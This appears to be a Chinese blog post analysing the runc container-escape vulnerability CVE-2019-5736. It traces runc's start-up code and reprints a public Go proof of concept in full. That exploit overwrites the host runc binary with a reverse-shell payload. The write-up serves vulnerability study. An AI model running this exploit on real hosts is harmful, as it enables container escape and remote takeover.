namespace隔离了进程pid的命名空间。当一个进程加入了某一pid命名空间之后，该命名空间中的其它进程就能够通过/proc文件系统观察到该进程，在权限允许的情况下，进程能够通过/proc/[pid]/exe找到其它进程对应的二进制文件。 pid_namespaces(7) - Linux manual page (man7.org) 漏洞成因 Runc init进程进入容器的namespace之后会执行容器中的程序。如果恶意容器可以欺骗runc init执行恶意的程序，则可以借助在主机上root权限运行的runc在主机上任意执行代码实现逃逸。 这里路径修改成了/proc/self/exe即runc init进程自身，这样runc就暴露在容器内部，从而容器内的程序可以调用runc在主机上执行命令。 执行过程大体是这样的：runc启动，加入到容器的命名空间，接着以自身（&#x2F;proc&#x2F;self&#x2F;exe，后面会解释）为范本启动一个子进程，最后通过exec系统调用执行用户指定的二进制程序。 runc启动容器过程分析runc run command命令runc run定义在下列代码中。 https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/run.go#L11 123456789101112131415161718192021222324252627282930var runCommand = cli.Command&#123; Name: &quot;run&quot;, Usage: &quot;create and run a container&quot;, ArgsUsage: `&lt;container-id&gt;Where &quot;&lt;container-id&gt;&quot; is your name for the instance of the container that youare starting. The name you provide for the container instance must be unique onyour host.`, Description: `The run command creates an instance of a container for a bundle. The bundleis a directory with a specification file named &quot;` + specConfig + `&quot; and a rootfilesystem.The specification file includes an args parameter. The args parameter is usedto specify command(s) that get run when the container is started. To change thecommand(s) that get executed on start, edit the args parameter of the spec. See&quot;runc spec --help&quot; for more explanation.`,//................................. Action: func(context *cli.Context) error &#123; if err := checkArgs(context, 1, exactArgs); err != nil &#123; return err &#125; status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil &#123; // exit with the container&#x27;s exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) &#125; return fmt.Errorf(&quot;runc run failed: %w&quot;, err) &#125;,&#125; Action中调用startContainer()函数，flag设置为CT_ACT_RUN，由config.json生成spec对象。 startContainerhttps://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L339 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) &#123; if err := revisePidFile(context); err != nil &#123; return -1, err &#125; spec, err := setupSpec(context) if err != nil &#123; return -1, err &#125; id := context.Args().First() if id == &quot;&quot; &#123; return -1, errEmptyID &#125; notifySocket := newNotifySocket(context, os.Getenv(&quot;NOTIFY_SOCKET&quot;), id) if notifySocket != nil &#123; notifySocket.setupSpec(spec) &#125; container, err := createContainer(context, id, spec) if err != nil &#123; return -1, err &#125; if notifySocket != nil &#123; if err := notifySocket.setupSocketDirectory(); err != nil &#123; return -1, err &#125; if action == CT_ACT_RUN &#123; if err := notifySocket.bindSocket(); err != nil &#123; return -1, err &#125; &#125; &#125; // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File&#123;&#125; if os.Getenv(&quot;LISTEN_FDS&quot;) != &quot;&quot; &#123; listenFDs = activation.Files(false) &#125; r := &amp;runner&#123; enableSubreaper: !context.Bool(&quot;no-subreaper&quot;), shouldDestroy: !context.Bool(&quot;keep&quot;), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(&quot;console-socket&quot;), detach: context.Bool(&quot;detach&quot;), pidFile: context.String(&quot;pid-file&quot;), preserveFDs: context.Int(&quot;preserve-fds&quot;), action: action, criuOpts: criuOpts, init: true, &#125; return r.run(spec.Process)&#125; setupSpec读取配置文件config.json，获取配置信息。 createContainer根据配置信息创建container对象。 createContainerhttps://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L165 123456789101112131415161718192021func createContainer(context *cli.Context, id string, spec *specs.Spec) (*libcontainer.Container, error) &#123; rootlessCg, err := shouldUseRootlessCgroupManager(context) if err != nil &#123; return nil, err &#125; config, err := specconv.CreateLibcontainerConfig(&amp;specconv.CreateOpts&#123; CgroupName: id, UseSystemdCgroup: context.GlobalBool(&quot;systemd-cgroup&quot;), NoPivotRoot: context.Bool(&quot;no-pivot&quot;), NoNewKeyring: context.Bool(&quot;no-new-keyring&quot;), Spec: spec, RootlessEUID: os.Geteuid() != 0, RootlessCgroups: rootlessCg, &#125;) if err != nil &#123; return nil, err &#125; root := context.GlobalString(&quot;root&quot;) return libcontainer.Create(root, id, config)&#125; createContainer将创建container对象的任务委托给libcontainer.Create libcontainer.Createhttps://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/libcontainer/factory_linux.go#L39-L109 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071func Create(root, id string, config *configs.Config) (*Container, error) &#123; if root == &quot;&quot; &#123; return nil, errors.New(&quot;root not set&quot;) &#125; if err := validateID(id); err != nil &#123; return nil, err &#125; if err := validate.Validate(config); err != nil &#123; return nil, err &#125; if err := os.MkdirAll(root, 0o700); err != nil &#123; return nil, err &#125; containerRoot, err := securejoin.SecureJoin(root, id) if err != nil &#123; return nil, err &#125; if _, err := os.Stat(containerRoot); err == nil &#123; return nil, ErrExist &#125; else if !os.IsNotExist(err) &#123; return nil, err &#125; cm, err := manager.New(config.Cgroups) if err != nil &#123; return nil, err &#125; // Check that cgroup does not exist or empty (no processes). // Note for cgroup v1 this check is not thorough, as there are multiple // separate hierarchies, while both Exists() and GetAllPids() only use // one for &quot;devices&quot; controller (assuming others are the same, which is // probably true in almost all scenarios). Checking all the hierarchies // would be too expensive. if cm.Exists() &#123; pids, err := cm.GetAllPids() // Reading PIDs can race with cgroups removal, so ignore ENOENT and ENODEV. if err != nil &amp;&amp; !errors.Is(err, os.ErrNotExist) &amp;&amp; !errors.Is(err, unix.ENODEV) &#123; return nil, fmt.Errorf(&quot;unable to get cgroup PIDs: %w&quot;, err) &#125; if len(pids) != 0 &#123; // TODO: return an error. logrus.Warnf(&quot;container&#x27;s cgroup is not empty: %d process(es) found&quot;, len(pids)) logrus.Warn(&quot;DEPRECATED: running container in a non-empty cgroup won&#x27;t be supported in runc 1.2; https://github.com/opencontainers/runc/issues/3132&quot;) &#125; &#125; // Check that cgroup is not frozen. Do not use Exists() here // since in cgroup v1 it only checks &quot;devices&quot; controller. st, err := cm.GetFreezerState() if err != nil &#123; return nil, fmt.Errorf(&quot;unable to get cgroup freezer state: %w&quot;, err) &#125; if st == configs.Frozen &#123; return nil, errors.New(&quot;container&#x27;s cgroup unexpectedly frozen&quot;) &#125; // Parent directory is already created above, so Mkdir is enough. if err := os.Mkdir(containerRoot, 0o711); err != nil &#123; return nil, err &#125; c := &amp;Container&#123; id: id, root: containerRoot, config: config, cgroupManager: cm, intelRdtManager: intelrdt.NewManager(config, id, &quot;&quot;), &#125; c.state = &amp;stoppedState&#123;c: c&#125; return c, nil&#125; 创建容器过程到此结束，下面是一步步返回到startContainer中，通过包含container对象的runner对象，调用r.run启动容器 123456789101112131415 r := &amp;runner&#123; enableSubreaper: !context.Bool(&quot;no-subreaper&quot;), shouldDestroy: !context.Bool(&quot;keep&quot;), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(&quot;console-socket&quot;), detach: context.Bool(&quot;detach&quot;), pidFile: context.String(&quot;pid-file&quot;), preserveFDs: context.Int(&quot;preserve-fds&quot;), action: action, criuOpts: criuOpts, init: true,&#125;return r.run(spec.Process) runner.runhttps://github.com/opencontainers/runc/blob/99968fc0874642300f688ce4d617a1e42ca7ce29/utils_linux.go#L203 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485func (r *runner) run(config *specs.Process) (int, error) &#123; var err error defer func() &#123; if err != nil &#123; r.destroy() &#125; &#125;() if err = r.checkTerminal(config); err != nil &#123; return -1, err &#125; process, err := newProcess(*config) if err != nil &#123; return -1, err &#125; process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init process.SubCgroupPaths = r.subCgroupPaths if len(r.listenFDs) &gt; 0 &#123; process.Env = append(process.Env, &quot;LISTEN_FDS=&quot;+strconv.Itoa(len(r.listenFDs)), &quot;LISTEN_PID=1&quot;) process.ExtraFiles = append(process.ExtraFiles, r.listenFDs...) &#125; baseFd := 3 + len(process.ExtraFiles) for i := baseFd; i &lt; baseFd+r.preserveFDs; i++ &#123; _, err = os.Stat(&quot;/proc/self/fd/&quot; + strconv.Itoa(i)) if err != nil &#123; return -1, fmt.Errorf(&quot;unable to stat preserved-fd %d (of %d): %w&quot;, i-baseFd, r.preserveFDs, err) &#125; process.ExtraFiles = append(process.ExtraFiles, os.NewFile(uintptr(i), &quot;PreserveFD:&quot;+strconv.Itoa(i))) &#125; rootuid, err := r.container.Config().HostRootUID() if err != nil &#123; return -1, err &#125; rootgid, err := r.container.Config().HostRootGID() if err != nil &#123; return -1, err &#125; detach := r.detach || (r.action == CT_ACT_CREATE) // Setting up IO is a two stage process. We need to modify process to deal // with detaching containers, and then we get a tty after the container has // started. handler := newSignalHandler(r.enableSubreaper, r.notifySocket) tty, err := setupIO(process, rootuid, rootgid, config.Terminal, detach, r.consoleSocket) if err != nil &#123; return -1, err &#125; defer tty.Close() switch r.action &#123; case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: err = r.container.Run(process) default: panic(&quot;Unknown action&quot;) &#125; if err != nil &#123; return -1, err &#125; if err = tty.waitConsole(); err != nil &#123; r.terminate(process) return -1, err &#125; tty.ClosePostStart() if r.pidFile != &quot;&quot; &#123; if err = createPidFile(r.pidFile, process); err != nil &#123; r.terminate(process) return -1, err &#125; &#125; status, err := handler.forward(process, tty, detach) if err != nil &#123; r.terminate(process) &#125; if detach &#123; return 0, nil &#125; if err == nil &#123; r.destroy() &#125; return status, err&#125; 在startContainer中设置了标志CT_ACT_RUN，所以在这里调用r.container.Run(process) 在libcontainer.Create中设置了container Container.Run123456789101112// Run immediately starts the process inside the container. Returns an error if// the process fails to start. It does not block waiting for the exec fifo// after start returns but opens the fifo after start returns.func (c *Container) Run(process *Process) error &#123; if err := c.Start(process); err != nil &#123; return err &#125; if process.Init &#123; return c.exec() &#125; return nil&#125; 通过libContainer.Container.Start启动一个子进程，然后调用c.exec Container.Start123456789101112131415161718192021// Start starts a process inside the container. Returns error if process fails// to start. You can track process lifecycle with passed Process structure.func (c *Container) Start(process *Process) error &#123; c.m.Lock() defer c.m.Unlock() if c.config.Cgroups.Resources.SkipDevices &#123; return errors.New(&quot;can&#x27;t start container with SkipDevices set&quot;) &#125; if process.Init &#123; if err := c.createExecFifo(); err != nil &#123; return err &#125; &#125; if err := c.start(process); err != nil &#123; if process.Init &#123; c.deleteExecFifo() &#125; return err &#125; return nil&#125; 委托给Container.start Container.starthttps://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/container_linux.go#L317-L356 12345678910111213141516171819202122232425262728293031323334353637383940func (c *Container) start(process *Process) (retErr error) &#123; parent, err := c.newParentProcess(process) if err != nil &#123; return fmt.Errorf(&quot;unable to create new parent process: %w&quot;, err) &#125; logsDone := parent.forwardChildLogs() if logsDone != nil &#123; defer func() &#123; // Wait for log forwarder to finish. This depends on // runc init closing the _LIBCONTAINER_LOGPIPE log fd. err := &lt;-logsDone if err != nil &amp;&amp; retErr == nil &#123; retErr = fmt.Errorf(&quot;unable to forward init logs: %w&quot;, err) &#125; &#125;() &#125; if err := parent.start(); err != nil &#123; return fmt.Errorf(&quot;unable to start container process: %w&quot;, err) &#125; if process.Init &#123; c.fifo.Close() if c.config.Hooks != nil &#123; s, err := c.currentOCIState() if err != nil &#123; return err &#125; if err := c.config.Hooks[configs.Poststart].RunHooks(s); err != nil &#123; if err := ignoreTerminateErrors(parent.terminate()); err != nil &#123; logrus.Warn(fmt.Errorf(&quot;error running poststart hook: %w&quot;, err)) &#125; return err &#125; &#125; &#125; return nil&#125; start()函数调用newParentProcess()创建父进程对象parent，并调用parent.start()启动子进程。 newParentProcesshttps://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/container_linux.go#L436-L463 12345678910111213141516171819202122232425262728func (c *Container) newParentProcess(p *Process) (parentProcess, error) &#123; parentInitPipe, childInitPipe, err := utils.NewSockPair(&quot;init&quot;) if err != nil &#123; return nil, fmt.Errorf(&quot;unable to create init pipe: %w&quot;, err) &#125; messageSockPair := filePair&#123;parentInitPipe, childInitPipe&#125; parentLogPipe, childLogPipe, err := os.Pipe() if err != nil &#123; return nil, fmt.Errorf(&quot;unable to create log pipe: %w&quot;, err) &#125; logFilePair := filePair&#123;parentLogPipe, childLogPipe&#125; cmd := c.commandTemplate(p, childInitPipe, childLogPipe) if !p.Init &#123; return c.newSetnsProcess(p, cmd, messageSockPair, logFilePair) &#125; // We only set up fifoFd if we&#x27;re not doing a `runc exec`. The historic // reason for this is that previously we would pass a dirfd that allowed // for container rootfs escape (and not doing it in `runc exec` avoided // that problem), but we no longer do that. However, there&#x27;s no need to do // this for `runc exec` so we just keep it this way to be safe. if err := c.includeExecFifo(cmd); err != nil &#123; return nil, fmt.Errorf(&quot;unable to setup exec fifo: %w&quot;, err) &#125; return c.newInitProcess(p, cmd, messageSockPair, logFilePair)&#125; newParentProcess首先创建了父子进程之间通信的管道，然后调用commandTemplate配置子进程的命令为runc init，并将管道文件传给子进程，让其可以与父进程通信。 parent.starthttps://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/process_linux.go#L356 123456func (p *initProcess) start() (retErr error) &#123; defer p.messageSockPair.parent.Close() //nolint: errcheck err := p.cmd.Start() //runc init p.process.ops = p //.......&#125; 启动runc init，也就是子进程 获取parentPipe； 调用execSetns()等待进程namespace等信息； 调用Apply()生成cgroup相关文件； 调用createNetworkInterfaces()初始化容器网络； 调用sendConfig()把配置发送给child进程，子进程在获取配置后才会往下执行； 通过pipe和child进程进行交互：当收到child进程的proReady信号，则调用Set()在cgroup中添加资源限制；当收到procHooks时，则执行config.json定义的prestart hooks；当child进程把pipe关闭时，则parent退出交互； 返回，也就意味着runc create进程结束。 p.cmd.Start接下来就进入到了runc init的执行过程，这也是实际完成启动容器进程的执行过程。 runc init命令对应的函数为init https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/init.go 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( &quot;os&quot; &quot;runtime&quot; &quot;strconv&quot; &quot;github.com/opencontainers/runc/libcontainer&quot; _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot; &quot;github.com/sirupsen/logrus&quot;)func init() &#123; if len(os.Args) &gt; 1 &amp;&amp; os.Args[1] == &quot;init&quot; &#123; // This is the golang entry point for runc init, executed // before main() but after libcontainer/nsenter&#x27;s nsexec(). runtime.GOMAXPROCS(1) runtime.LockOSThread() level, err := strconv.Atoi(os.Getenv(&quot;_LIBCONTAINER_LOGLEVEL&quot;)) if err != nil &#123; panic(err) &#125; logPipeFd, err := strconv.Atoi(os.Getenv(&quot;_LIBCONTAINER_LOGPIPE&quot;)) if err != nil &#123; panic(err) &#125; logrus.SetLevel(logrus.Level(level)) logrus.SetOutput(os.NewFile(uintptr(logPipeFd), &quot;logpipe&quot;)) logrus.SetFormatter(new(logrus.JSONFormatter)) logrus.Debug(&quot;child process in init()&quot;) if err := libcontainer.StartInitialization(); err != nil &#123; // as the error is sent back to the parent there is no need to log // or write it to stderr because the parent process will handle this os.Exit(1) &#125; panic(&quot;libcontainer: container init failed to exec&quot;) &#125;&#125; 其中引入了nsenter包，由于CGO的特新，nsenter中的nsexec函数会首先被执行，它主要完成进入namespace的操作。 nsexechttps://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/nsenter/nsexec.c#L835 这也是之后漏洞修复的位置。 之后执行Init函数中的libcontainer.StartInitialization StartInitializationhttps://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/factory_linux.go#L159 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283// StartInitialization loads a container by opening the pipe fd from the parent// to read the configuration and state. This is a low level implementation// detail of the reexec and should not be consumed externally.func StartInitialization() (err error) &#123; // Get the INITPIPE. envInitPipe := os.Getenv(&quot;_LIBCONTAINER_INITPIPE&quot;) pipefd, err := strconv.Atoi(envInitPipe) if err != nil &#123; err = fmt.Errorf(&quot;unable to convert _LIBCONTAINER_INITPIPE: %w&quot;, err) logrus.Error(err) return err &#125; pipe := os.NewFile(uintptr(pipefd), &quot;pipe&quot;) defer pipe.Close() defer func() &#123; // We have an error during the initialization of the container&#x27;s init, // send it back to the parent process in the form of an initError. if werr := writeSync(pipe, procError); werr != nil &#123; fmt.Fprintln(os.Stderr, err) return &#125; if werr := utils.WriteJSON(pipe, &amp;initError&#123;Message: err.Error()&#125;); werr != nil &#123; fmt.Fprintln(os.Stderr, err) return &#125; &#125;() // Only init processes have FIFOFD. fifofd := -1 envInitType := os.Getenv(&quot;_LIBCONTAINER_INITTYPE&quot;) it := initType(envInitType) if it == initStandard &#123; envFifoFd := os.Getenv(&quot;_LIBCONTAINER_FIFOFD&quot;) if fifofd, err = strconv.Atoi(envFifoFd); err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_FIFOFD: %w&quot;, err) &#125; &#125; var consoleSocket *os.File if envConsole := os.Getenv(&quot;_LIBCONTAINER_CONSOLE&quot;); envConsole != &quot;&quot; &#123; console, err := strconv.Atoi(envConsole) if err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_CONSOLE: %w&quot;, err) &#125; consoleSocket = os.NewFile(uintptr(console), &quot;console-socket&quot;) defer consoleSocket.Close() &#125; logPipeFdStr := os.Getenv(&quot;_LIBCONTAINER_LOGPIPE&quot;) logPipeFd, err := strconv.Atoi(logPipeFdStr) if err != nil &#123; return fmt.Errorf(&quot;unable to convert _LIBCONTAINER_LOGPIPE: %w&quot;, err) &#125; // Get mount files (O_PATH). mountFds, err := parseMountFds() if err != nil &#123; return err &#125; // clear the current process&#x27;s environment to clean any libcontainer // specific env vars. os.Clearenv() defer func() &#123; if e := recover(); e != nil &#123; if ee, ok := e.(error); ok &#123; err = fmt.Errorf(&quot;panic from initialization: %w, %s&quot;, ee, debug.Stack()) &#125; else &#123; err = fmt.Errorf(&quot;panic from initialization: %v, %s&quot;, e, debug.Stack()) &#125; &#125; &#125;() i, err := newContainerInit(it, pipe, consoleSocket, fifofd, logPipeFd, mountFds) if err != nil &#123; return err &#125; // If Init succeeds, syscall.Exec will not return, hence none of the defers will be called. return i.Init()&#125; 之后通过newContainerInit创建LinuxStandard对象，并调用LinuxStandard.Init函数进行容器初始化。 LinuxStandard.Inithttps://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/standard_init_linux.go#L48 123456789101112131415161718192021222324252627282930func (l *linuxStandardInit) Init() error &#123; //... //Set network if err := setupNetwork(l.config); err != nil &#123; return err &#125; //Set route if err := setupRoute(l.config.Config); err != nil &#123; return err &#125; // initialises the labeling system selinux.GetEnabled() //切换为容器内的文件系统 if err := prepareRootfs(l.pipe, l.config); err != nil &#123; return err &#125; //... // Check for the arg before waiting to make sure it exists and it is // returned as a create time error. name, err := exec.LookPath(l.config.Args[0]) if err != nil &#123; return err &#125; //... //启动容器进程替换自身进程 if err := system.Exec(name, l.config.Args[0:], os.Environ()); err != nil &#123; return fmt.Errorf(&quot;can&#x27;t exec user process: %w&quot;, err) &#125; return nil Init()函数会完成容器的网络设置、切换文件系统等操作，最后调用system.Exec()替换自身。至此，容器启动流程执行完毕。 Poc分析Frichetten&#x2F;CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package main// Implementation of CVE-2019-5736// Created with help from @singe, @_cablethief, and @feexd.// This commit also helped a ton to understand the vuln// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9dimport ( &quot;fmt&quot; &quot;io/ioutil&quot; &quot;os&quot; &quot;strconv&quot; &quot;strings&quot;)// This is the line of shell commands that will execute on the hostvar payload = &quot;#!/bin/bash \\n bash -i &gt;&amp; /dev/tcp/攻击机的ip/监听端口 0&gt;&amp;1&quot;func main() &#123; // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(&quot;/bin/sh&quot;) if err != nil &#123; fmt.Println(err) return &#125; fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;) err = fd.Close() if err != nil &#123; fmt.Println(err) return &#125; fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;) // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 &#123; pids, err := ioutil.ReadDir(&quot;/proc&quot;) if err != nil &#123; fmt.Println(err) return &#125; for _, f := range pids &#123; fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;) fstring := string(fbytes) if strings.Contains(fstring, &quot;runc&quot;) &#123; fmt.Println(&quot;[+] Found the PID:&quot;, f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil &#123; fmt.Println(err) return &#125; &#125; &#125; &#125; // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 &#123; // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777) if int(handle.Fd()) &gt; 0 &#123; handleFd = int(handle.Fd()) &#125; &#125; fmt.Println(&quot;[+] Successfully got the file handle&quot;) // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it&#x27;s executable flag for &#123; writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) &gt; 0 &#123; fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle) writeHandle.Write([]byte(payload)) return &#125; &#125;&#125; 我们在执行功能类似于docker exec的命令（其他的如docker run等，不再讨论）时，底层实际上是容器运行时在操作。例如runc，相应地，runc exec命令会被执行。它的最终效果是在容器内部执行用户指定的程序。进一步讲，就是在容器的各种命名空间内，受到各种限制（如cgroups）的情况下，启动一个进程。除此以外，这个操作与宿主机上执行一个程序并无二致。 执行过程大体是这样的：runc启动，加入到容器的命名空间，接着以自身（&#x2F;proc&#x2F;self&#x2F;exe，后面会解释）为范本启动一个子进程，最后通过exec系统调用执行用户指定的二进制程序，也就是&#x2F;bin&#x2F;sh。 这个过程看起来似乎没有问题。现在，我们需要让另一个角色出场——proc伪文件系统，即&#x2F;proc。关于这个概念，Linux文档已经给出了详尽的说明，这里我们主要关注&#x2F;proc下的两类文件： &#x2F;proc&#x2F;[PID]&#x2F;exe：它是一种特殊的符号链接，又被称为magic links（为什么将这类符号链接叫做magic links呢？这一点对当前漏洞的形成至关重要），指向进程自身对应的本地程序文件（例如我们执行ls，&#x2F;proc&#x2F;[ls-PID]&#x2F;exe就指向&#x2F;bin&#x2F;ls）； &#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;：这个目录下包含了进程打开的所有文件描述符。 &#x2F;proc&#x2F;[PID]&#x2F;exe的特殊之处在于，如果你去打开这个文件，在权限检查通过的情况下，内核将直接返回给你一个指向该文件的描述符（file descriptor），而非按照传统的打开方式去做路径解析和文件查找。这样一来，它实际上绕过了mnt命名空间及chroot对一个进程能够访问到的文件路径的限制。 那么，设想这样一种情况：在runc exec加入到容器的命名空间之后，容器内进程已经能够通过内部&#x2F;proc观察到它，此时如果打开&#x2F;proc&#x2F;[runc-PID]&#x2F;exe并写入一些内容，就能够实现将宿主机上的runc二进制程序覆盖掉！这样一来，下一次用户调用runc去执行命令时，实际执行的将是攻击者放置的指令。 在未升级的容器环境上，上述思路是可行的，但是攻击者想要在容器内实现宿主机上的代码执行（逃逸），还需要面对两个限制： 需要具有容器内部root权限； Linux不允许修改正在运行进程对应的本地二进制文件。 事实上，限制1经常不存在，很多容器服务开放给用户的仍然是root权限；而限制2是可以克服的。 要在容器中运行这一段poc代码。 poc首先定义了payload，这是一个反弹shell命令。 12345678910111213 // First we overwrite /bin/sh with the /proc/self/exe interpreter pathfd, err := os.Create(&quot;/bin/sh&quot;)if err != nil &#123; fmt.Println(err) return&#125;fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)err = fd.Close()if err != nil &#123; fmt.Println(err) return&#125;fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;) 这段代码首先打开&#x2F;bin&#x2F;sh文件，得到其文件描述符，将它替换为&#x2F;proc&#x2F;self&#x2F;exe，即当前进程的可执行文件，即在容器中运行&#x2F;bin&#x2F;sh时，就会替换为当前进程的可执行文件。也就是说如果不替换的话，执行的时&#x2F;bin&#x2F;sh，&#x2F;proc中的进程就没有名为runc的进程，如果替换成&#x2F;proc&#x2F;self&#x2F;exe的话，当再次启动docker exec时，启动runc进程进入容器时，启动的进程就不是&#x2F;bin&#x2F;sh，运行的进程就是&#x2F;proc&#x2F;self&#x2F;exe的可执行文件，进程名就是runc。 12345678910111213141516171819202122// Loop through all processes to find one whose cmdline includes runcinit// This will be the process created by runcvar found intfor found == 0 &#123; pids, err := ioutil.ReadDir(&quot;/proc&quot;) if err != nil &#123; fmt.Println(err) return &#125; for _, f := range pids &#123; fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;) fstring := string(fbytes) if strings.Contains(fstring, &quot;runc&quot;) &#123; fmt.Println(&quot;[+] Found the PID:&quot;, f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil &#123; fmt.Println(err) return &#125; &#125; &#125;&#125; poc的代码中循环查找&#x2F;proc中的进程，如果有runc进程，获取它的进程号。 12345678910// We will use the pid to get a file handle for runc on the host.var handleFd = -1for handleFd == -1 &#123; // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777) if int(handle.Fd()) &gt; 0 &#123; handleFd = int(handle.Fd()) &#125;&#125;fmt.Println(&quot;[+] Successfully got the file handle&quot;) 在这段代码中，以只读方式打开&#x2F;proc&#x2F;runc-pid&#x2F;exe文件，得到其文件描述符。 12345678910// Now that we have the file handle, lets write to the runc binary and overwrite it// It will maintain it&#x27;s executable flagfor &#123; writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) &gt; 0 &#123; fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle) writeHandle.Write([]byte(payload)) return &#125;&#125; 持续尝试以写方式打开上面代码中获得的只读fd（&#x2F;proc&#x2F;self&#x2F;fd&#x2F;[fd]），一开始总是返回失败，直到runc结束占用后写方式打开成功，立即通过该fd向宿主机上&#x2F;usr&#x2F;bin&#x2F;runc（名字也可能是&#x2F;usr&#x2F;bin&#x2F;docker-runc）写入攻击载荷；也就是payload反弹shell命令。 首先启动容器，在容器上运行poc，将&#x2F;bin&#x2F;sh替换为&#x2F;proc&#x2F;self&#x2F;exe,然后进入到循环查找runc进程的代码中，这个时候还找不到runc进程，然后再次运行docker exec，这个时候runc进程进入容器，但是执行的不是&#x2F;bin&#x2F;sh，而是&#x2F;proc&#x2F;self&#x2F;exe，所以在容器中我们就可以找到runc进程了，然后打开&#x2F;proc&#x2F;self&#x2F;exe，将其写为反弹shell命令，这样runc在容器中运行的就是反弹shell命令，这样就完成了攻击。 内核流程分析有一类特殊的类似符号链接的对象称为“magic links”，可以在某些伪文件系统中找到它，例如 &#x2F;proc中的一些（示例包括 &#x2F;proc&#x2F;pid&#x2F;exe 和 &#x2F;proc&#x2F;pid&#x2F;fd &#x2F;*)。与普通的符号链接不同，magic links不是通过路径名扩展来解析的，而是充当对内核自己的文件句柄表示的直接引用。 参考资料https://e3g4xrthd5.feishu.cn/docx/B2Ukdk2ouoDoSPxobuwcrpHtn3T Docs symlink(7) - Linux manual page — 符号链接(7) - Linux 手册页 (man7.org)","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"学习 Linux /proc/[pid]下文件访问权限分析","slug":"学习-Linux-proc-pid-下文件访问权限分析","date":"2023-12-15T06:51:50.000Z","updated":"2023-12-22T08:58:46.080Z","comments":true,"path":"2023/12/15/学习-Linux-proc-pid-下文件访问权限分析/","link":"","permalink":"http://example.com/2023/12/15/%E5%AD%A6%E4%B9%A0-Linux-proc-pid-%E4%B8%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%88%86%E6%9E%90/","excerpt":"proc(5) - Linux manual page (man7.org) proc访问模式检查ptrace(2) - Linux manual page (man7.org)","text":"proc(5) - Linux manual page (man7.org) proc访问模式检查ptrace(2) - Linux manual page (man7.org) 用于 ptrace 访问模式检查的算法确定是否允许调用进程对目标进程执行相应的操作。（在打开 &#x2F;proc&#x2F;pid 文件的情况下，“调用进程”是打开文件的进程，具有相应 PID 的进程是“目标进程”。算法如下： (1) 如果调用线程和目标线程在同一线程组中，访问总是被允许。 (2) 如果访问模式指定了 PTRACE_MODE_FSCREDS，则在下一步的检查中使用调用者的文件系统 UID 和 GID。否则，访问模式指定 